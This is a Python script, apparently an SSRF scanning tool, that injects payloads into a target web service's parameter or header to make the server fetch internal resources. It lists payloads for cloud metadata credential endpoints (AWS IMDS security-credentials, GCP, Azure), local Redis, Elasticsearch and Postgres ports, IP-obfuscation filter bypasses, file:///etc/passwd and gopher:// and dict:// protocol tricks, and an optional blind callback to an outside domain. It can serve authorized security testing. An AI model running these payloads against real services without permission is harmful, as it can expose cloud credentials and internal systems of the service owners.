#!/usr/bin/env python3
"""
ssrf-probe — probe a parameter or header for Server-Side Request Forgery.

Tests:
  1. Cloud metadata endpoints (169.254.169.254, fd00:ec2::254, etc.)
  2. Internal service sweep (localhost:22/80/443/3000/8080/8443/9200/6379/5432)
  3. IPv6/IPv4 obfuscation bypasses (0177.0.0.1, 0x7f000001, [::1], etc.)
  4. Blind SSRF via DNS-based callback (requires --callback-domain)
  5. Redirect chain detection (30x → target)
  6. Protocol bypass (dict://, gopher://, file://)

Usage:
  ssrf-probe.py --url https://api.acme.com/fetch --param url
                [--header X-Forwarded-For] [--method POST] [--data '{}']
                [--token Bearer_xxx] [--callback-domain ssrf.BURP-COLLAB.net]
                [--json] [--out results.json]
Exit: 0 clean · 1 findings.
"""
import sys, re, json, time, ssl, socket, threading
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import HTTPError

def arg(n, d=None):
    return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d
def args_multi(n):
    vals = []
    for i,a in enumerate(sys.argv):
        if a == n and i+1 < len(sys.argv): vals.append(sys.argv[i+1])
    return vals
def flag(n): return n in sys.argv

# ── internal targets ────────────────────────────────────────────────────
METADATA = [
    ("aws_imds_v1",    "http://169.254.169.254/latest/meta-data/", ["ami-id","instance-id","iam/"]),
    ("aws_imds_v2",    "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["iam-role"]),
    ("gcp_metadata",   "http://metadata.google.internal/computeMetadata/v1/", ["project/"]),
    ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["computeName","subscriptionId"]),
    ("aws_ipv6",       "http://fd00:ec2::254/latest/meta-data/", ["ami-id"]),
    ("localhost_80",   "http://localhost/", ["nginx","apache","iis","html"]),
    ("localhost_8080",  "http://localhost:8080/", ["html","tomcat","jetty"]),
    ("localhost_8443",  "https://localhost:8443/", ["html"]),
    ("localhost_3000",  "http://localhost:3000/", ["html","json"]),
    ("localhost_6379",  "http://localhost:6379/", ["-ERR","NOAUTH","redis"]),
    ("localhost_9200",  "http://localhost:9200/", ["elasticsearch","cluster_name"]),
    ("localhost_5432",  "http://localhost:5432/", ["postgres","pg_hba"]),
    ("internal_10",    "http://10.0.0.1/", ["html","routerlogin"]),
    ("internal_192",   "http://192.168.1.1/", ["html","login"]),
]

BYPASS_VARIANTS = [
    ("hex_ip",       "http://0x7f000001/"),
    ("octal_ip",     "http://0177.0.0.1/"),
    ("decimal_ip",   "http://2130706433/"),
    ("ipv6_loopback","http://[::1]/"),
    ("ipv6_short",   "http://[::ffff:127.0.0.1]/"),
    ("dns_redir",    "http://localtest.me/"),         # resolves to 127.0.0.1
    ("cname_redir",  "http://spoofed.burpcollaborator.net/"),
    ("proto_file",   "file:///etc/passwd"),
    ("proto_dict",   "dict://localhost:11211/stat"),
    ("proto_gopher",  "gopher://localhost:6379/_PING"),
]

def build_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    return ctx

def inject_and_send(base_url, param, payload, method, token, extra_headers, body_template, timeout=8):
    """Inject payload into param (GET querystring or POST JSON body)."""
    import urllib.request, urllib.parse
    ctx = build_ctx()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if token: headers["Authorization"] = token if " " in token else f"Bearer {token}"
    for h in (extra_headers or []):
        if ":" in h:
            k, v = h.split(":", 1); headers[k.strip()] = v.strip()
    data = None
    target = base_url
    if method.upper() == "GET":
        sep = "&" if "?" in base_url else "?"
        target = f"{base_url}{sep}{urllib.parse.quote(param, safe='')}={urllib.parse.quote(payload, safe='')}"
    else:
        # inject into body
        try:
            body = json.loads(body_template or "{}")
        except Exception:
            body = {}
        body[param] = payload
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = Request(target, data=data, headers=headers, method=method)
    try:
        with opener.open(req, timeout=timeout) as r:
            resp = r.read(4096).decode("utf-8", "ignore")
            final_url = str(r.url)
            return r.status, resp, final_url
    except HTTPError as e:
        try: resp = e.read(2048).decode("utf-8", "ignore")
        except: resp = ""
        return e.code, resp, ""
    except Exception as ex:
        return 0, str(ex)[:200], ""

def check_metadata_response(name, resp, indicators):
    if not resp: return False
    for ind in indicators:
        if ind.lower() in resp.lower(): return True
    # also check for JSON with instance data
    try:
        obj = json.loads(resp)
        if isinstance(obj, dict) and len(obj) > 0: return True
    except Exception: pass
    return False

def get_baseline(url, param, method, token, extra_headers, body_template):
    status, resp, _ = inject_and_send(url, param, "https://example.com/baseline", method, token, extra_headers, body_template)
    return status, len(resp)

def main():
    url           = arg("--url")
    param         = arg("--param", "url")
    header_inject = arg("--header")  # if set, inject into this header instead of param
    method        = arg("--method", "GET").upper()
    token         = arg("--token")
    extra_h       = args_multi("--header") if not arg("--header") else []
    body_tpl      = arg("--data")
    callback      = arg("--callback-domain")
    out_file      = arg("--out")

    if not url: print(__doc__); sys.exit(0)

    findings = []

    print(f"[ssrf-probe] target={url} param={param} method={method}", file=sys.stderr)

    # baseline
    base_status, base_size = get_baseline(url, param, method, token, extra_h, body_tpl)
    print(f"[ssrf-probe] baseline HTTP {base_status} size={base_size}", file=sys.stderr)

    # test metadata + internal endpoints
    for name, target_url, indicators in METADATA:
        print(f"[ssrf-probe] testing {name} …", file=sys.stderr)
        status, resp, final = inject_and_send(url, param, target_url, method, token, extra_h, body_tpl)
        hit = check_metadata_response(name, resp, indicators)
        # also check for redirect to internal
        redirect_hit = final and any(h in final for h in ("169.254","localhost","127.0.0.1","::1","10.","192.168."))
        if hit or redirect_hit:
            sev = "critical" if "metadata" in name or "imds" in name else "high"
            findings.append({
                "attack": "ssrf_internal",
                "target": target_url,
                "name": name,
                "severity": sev,
                "status": status,
                "response_snippet": resp[:300],
                "redirect_to": final if redirect_hit else "",
                "note": f"SSRF to {name}: server fetched internal resource",
            })
            print(f"  ✓ HIT: {name} HTTP {status}", file=sys.stderr)

    # bypass variants (only test against localhost to reduce noise)
    for name, target_url in BYPASS_VARIANTS:
        status, resp, final = inject_and_send(url, param, target_url, method, token, extra_h, body_tpl, timeout=5)
        # different error or non-empty resp compared to baseline
        if status not in (0, base_status) and status not in (400, 422, 403, 404):
            if resp and len(resp) > 20:
                findings.append({
                    "attack": "ssrf_bypass",
                    "target": target_url,
                    "name": name,
                    "severity": "high",
                    "status": status,
                    "response_snippet": resp[:200],
                    "note": f"Bypass variant {name} got unexpected HTTP {status} (baseline {base_status})",
                })

    # blind SSRF via callback DNS
    if callback:
        subdomain = f"ssrf-{int(time.time())}.{callback}"
        status, resp, _ = inject_and_send(url, param, f"http://{subdomain}/", method, token, extra_h, body_tpl)
        findings.append({
            "attack": "blind_ssrf",
            "target": f"http://{subdomain}/",
            "name": "callback_dns",
            "severity": "high",
            "status": status,
            "response_snippet": "",
            "note": f"Blind SSRF: check {callback} DNS logs/Burp Collaborator for a DNS lookup from the server",
        })
        print(f"[ssrf-probe] blind SSRF payload sent → check {callback}", file=sys.stderr)

    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url, "param": param,
        "total": len(findings),
        "critical": sum(1 for f in findings if f["severity"]=="critical"),
        "high":     sum(1 for f in findings if f["severity"]=="high"),
        "findings": findings,
    }
    if out_file: Path(out_file).write_text(json.dumps(result, indent=2))

    if flag("--json"):
        print(json.dumps(result)); sys.exit(1 if findings else 0)

    print(f"\n══ SSRF probe · {url} ══════════════════════════")
    print(f"  Param: {param}  Findings: {len(findings)} (crit: {result['critical']} high: {result['high']})")
    if findings:
        print()
        for f in findings:
            print(f"  [{f['severity'].upper():<8}] {f['name']}")
            print(f"             target: {f['target']}")
            if f.get("response_snippet"): print(f"             resp: {f['response_snippet'][:100]}")
            print(f"             {f['note'][:100]}")
    else:
        print("  No SSRF found with tested payloads.")

    sys.exit(1 if findings else 0)

if __name__ == "__main__":
    main()
